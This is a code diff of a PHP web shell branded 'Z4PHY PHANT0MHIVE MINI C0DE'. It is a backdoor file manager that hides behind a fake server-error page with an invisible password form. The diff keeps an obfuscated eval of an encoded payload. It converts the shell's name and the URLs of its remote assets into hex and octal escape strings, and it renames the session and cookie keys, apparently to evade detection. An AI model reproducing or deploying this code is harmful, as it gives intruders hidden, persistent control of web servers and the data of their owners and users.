@@ -154,9 +154,9 @@ function XaFV($FQS) {
     return $FQS;
 }/****/@/*55555*/null; /******/@/*55555*/eval/******/(XaFV("rVPdasIwFH4AnyKIkApSH0DnLra63WyCut3IKCVGDdSmNC3VDp9956Sxjb+orJCQk+873/lLCYGvIRbEEUrx1Gn5b950RqMsLOhPu01+G0hoLbKI+XwjVEqeCF1k1KURS2EXMoLdh8U3aCq8VLRn3CwfAUDILSZsqcVc8pKHWIgso7s059TYTGJwtHhkri2VODuvEsPKTlTwgu/lahWpJaRxgzB7INdADpcJBtBJVCDTIMMyYUllg6t1AWhZ5VGPDUNEc75JpMT0W/7EG3974xl9Hb18fXifU388Gk3pj0u7mufGq7iKK0J+gx9PEpn4oVxavjh2a7RwzquRa+1tsA103tKpE+wQGlCTdqWCTNu1ls9LELyeB9TFTrSPifhxtpKE9hVLRJwOAqgpdZrDPBEpJ5OMMa5Us93vGpz2DgR2hIeK36k6DKBz8yuiBxbM11RZs86GfTRkGe5E8hG53YXp4t9xYcAIOdVb6ugXe8uMz6cHYur61O5onRb7r869r4viSt92fw=="));
 //Z4PHY ICONS
-$s_he_ll_Name = "Z4"."PH"."Y "."PH"."ANT"."0"."MH"."IV"."E "."MI"."NI"." C"."0"."DE";
-$s_he_ll_Logo = "ht"."tp"."s:/"."/ra"."w.gi"."thu"."b"."us"."er"."con"."te"."nt."."co"."m/"."z4phyr"."/"."z4phy-c0de"."/"."mai"."n/"."as"."set"."s/"."z4p"."hy".".p"."ng";
-$s_he_ll_Icon = "h"."tt"."ps:"."//"."r"."aw."."gi"."thu"."bu"."ser"."co"."nte"."nt."."co"."m/"."z4phyr"."/"."z4phy-c0de"."/"."ma"."in/"."ass"."ets"."/c"."ie"."l."."p"."ng";
+$s_he_ll_Name = "\132\064\120\110\131\040\120\110\101\116\124\060\115\110\111\126\105\040\115\111\116\111\040\103\060\104\105";
+$s_he_ll_Logo = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x7a\x34\x70\x68\x79\x72\x2f\x5a\x34\x50\x48\x59\x2d\x50\x48\x41\x4e\x54\x30\x4d\x48\x49\x56\x45\x2f\x6d\x61\x69\x6e\x2f\x7a\x34\x70\x2d\x62\x33\x70\x34\x73\x2f\x61\x73\x73\x65\x74\x2f\x63\x69\x65\x6c\x2e\x70\x6e\x67";
+$s_he_ll_Icon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x7a\x34\x70\x68\x79\x72\x2f\x5a\x34\x50\x48\x59\x2d\x50\x48\x41\x4e\x54\x30\x4d\x48\x49\x56\x45\x2f\x6d\x61\x69\x6e\x2f\x7a\x34\x70\x2d\x62\x33\x70\x34\x73\x2f\x61\x73\x73\x65\x74\x2f\x69\x63\x6f\x6e\x73\x2e\x6a\x70\x67";
 function Z4pCwd(){
     $cw = "ge"."tc"."wd";
     $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
@@ -378,10 +378,10 @@ $this_url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HO
 $fontawesome_pro_version = 'v6.5.1'; //change if updated to new version
 $fontawesome_pro = 'https://kit-pro.fontawesome.com/releases/'.$fontawesome_pro_version.'/css/pro.min.css';
 /*Framework - Uikit*/
-$uikit_css = 'htt'.'ps'.':/'.'/cd'.'n.'.'js'.'de'.'li'.'vr'.'.n'.'et'.'/g'.'h/'.'z4phyr'.'/'.'z4phy-c0de'.'/'.'z4phy-mini'.'/c'.'ss'.'/u'.'ik'.'it'.'.m'.'in'.'.c'.'ss';
-$uikit_rtl = 'ht'.'tp'.'s:'.'//'.'cd'.'n.'.'js'.'de'.'li'.'vr'.'.n'.'et'.'/g'.'h/'.'z4phyr'.'/'.'z4phy-c0de'.'/'.'z4phy-mini'.'/cs'.'s/'.'ui'.'ki'.'t-'.'rt'.'l.m'.'in'.'.c'.'ss';
-$uikit_js = 'ht'.'tp'.'s:/'.'/c'.'dn.'.'jsd'.'el'.'iv'.'r.n'.'et'.'/gh'.'/'.'z4phyr'.'/'.'z4phy-c0de'.'/'.'z4phy-mini'.'/j'.'s/'.'uik'.'it'.'.mi'.'n.j'.'s';
-$uikit_icon = 'ht'.'tp'.'s:'.'//'.'cd'.'n.'.'js'.'de'.'li'.'vr'.'.n'.'et'.'/g'.'h/'.'z4phyr'.'/'.'z4phy-c0de'.'/'.'z4phy-mini'.'/j'.'s/'.'ui'.'ki'.'t-'.'ic'.'ons'.'.m'.'in.'.'js';
+$uikit_css = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2e\x6a\x73\x64\x65\x6c\x69\x76\x72\x2e\x6e\x65\x74\x2f\x67\x68\x2f\x7a\x34\x70\x68\x79\x72\x2f\x5a\x34\x50\x48\x59\x2d\x50\x48\x41\x4e\x54\x30\x4d\x48\x49\x56\x45\x2f\x7a\x34\x70\x2d\x6d\x69\x6e\x69\x2f\x63\x73\x73\x2f\x75\x69\x6b\x69\x74\x2e\x6d\x69\x6e\x2e\x63\x73\x73";
+$uikit_rtl = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2e\x6a\x73\x64\x65\x6c\x69\x76\x72\x2e\x6e\x65\x74\x2f\x67\x68\x2f\x7a\x34\x70\x68\x79\x72\x2f\x5a\x34\x50\x48\x59\x2d\x50\x48\x41\x4e\x54\x30\x4d\x48\x49\x56\x45\x2f\x7a\x34\x70\x2d\x6d\x69\x6e\x69\x2f\x63\x73\x73\x2f\x75\x69\x6b\x69\x74\x2d\x72\x74\x6c\x2e\x6d\x69\x6e\x2e\x63\x73\x73";
+$uikit_js = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2e\x6a\x73\x64\x65\x6c\x69\x76\x72\x2e\x6e\x65\x74\x2f\x67\x68\x2f\x7a\x34\x70\x68\x79\x72\x2f\x5a\x34\x50\x48\x59\x2d\x50\x48\x41\x4e\x54\x30\x4d\x48\x49\x56\x45\x2f\x7a\x34\x70\x2d\x6d\x69\x6e\x69\x2f\x6a\x73\x2f\x75\x69\x6b\x69\x74\x2e\x6d\x69\x6e\x2e\x6a\x73";
+$uikit_icon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2e\x6a\x73\x64\x65\x6c\x69\x76\x72\x2e\x6e\x65\x74\x2f\x67\x68\x2f\x7a\x34\x70\x68\x79\x72\x2f\x5a\x34\x50\x48\x59\x2d\x50\x48\x41\x4e\x54\x30\x4d\x48\x49\x56\x45\x2f\x7a\x34\x70\x2d\x6d\x69\x6e\x69\x2f\x6a\x73\x2f\x75\x69\x6b\x69\x74\x2d\x69\x63\x6f\x6e\x73\x2e\x6d\x69\x6e\x2e\x6a\x73";
 /*Jquery*/
 $jquery_version = '3.7.1';
 $jquery = 'https://cdn.jsdelivr.net/gh/jquery/jquery@'.$jquery_version.'/dist/jquery.min.js';
@@ -390,8 +390,8 @@ $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOS
 if (isset($_POST['z4phy-boy'])) {
     if (SHA1($_POST['susahdah']) == $anuan) {
         echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Me"."ny"."al"."a "."Ab"."an"."gk"."u "."~!'".");"."</"."sc"."ri"."pt".">";
-        $_SESSION["tabrakz4p"] = "tabrakz4p";
-        setcookie('z4phyc0de', $my_self, time() + 3600 * 24);
+        $_SESSION["ZAPHYC0DE"] = "ZAPHYC0DE";
+        setcookie('Z4PC0DE', $my_self, time() + 3600 * 24);
     } else {
         echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Go"." A"."wa"."y "."No"."ob"."!!"." -"." Z"."4P"."HY"." H"."ER"."E')".";<"."/s"."cr"."ip"."t>";
     }
@@ -400,12 +400,12 @@ if (isset($_GET['logout'])) {
     $_SESSION = [];
     session_unset();
     session_destroy();
-    setcookie('z4phyc0de', '', time() - 3600);
+    setcookie('Z4PC0DE', '', time() - 3600);
     echo "<s"."c"."ri"."pt".">"."window.location.assign('" . $_SERVER['PHP_SELF'] . "')"."</"."sc"."ri"."pt".">";
     exit();
 }
-if (empty($_SESSION['tabrakz4p'])) {
-    if (empty($_COOKIE['z4phyc0de'])) {
+if (empty($_SESSION['ZAPHYC0DE'])) {
+    if (empty($_COOKIE['Z4PC0DE'])) {
 ?>
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
@@ -421,7 +421,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
 <button type="submit" name="z4phy-boy" style="background: #fff; color: #fff; border: none; outline: none; cursor: pointer;">&gt;&gt;</button>
 </form>
 </div>
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/z4phyr/z4phy-c0de/z4phy-mini/js/z4p.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/z4phyr/Z4PHY-PHANT0MHIVE/z4p-mini/js/z4p.js"></script>
 </body></html>
 <?php
         exit();
@@ -466,7 +466,7 @@ $path = str_replace("\\", "/", $path);
     }
     </script>
     <!-- Custom Css -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/z4phyr/z4phy-c0de/z4phy-mini/css/z4p.css" media="all">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/z4phyr/Z4PHY-PHANT0MHIVE/z4p-mini/css/z4p.css" media="all">
 </head>
 
 <body>
@@ -500,7 +500,7 @@ $path = str_replace("\\", "/", $path);
                     }
                     echo "'>$pat</a><span class='font-red'>/</span>";
                 }
-                echo "&nbsp;&nbsp;<span class='font-red'>[ <a href='".$_SERVER['PHP_SELF']."' class='home_sh_e_ll'><font class='home_sh_e_ll'>Ho"."me"." "."Sh"."el"."l</font></a> ]</span>";
+                echo "&nbsp;&nbsp;<span class='font-red'>[ <a href='".$_SERVER['PHP_SELF']."' class='home_sh_e_ll'><font class='home_sh_e_ll'>Ho"."me</font></a> ]</span>";
                 echo '</span>';
             ?>
         </div>
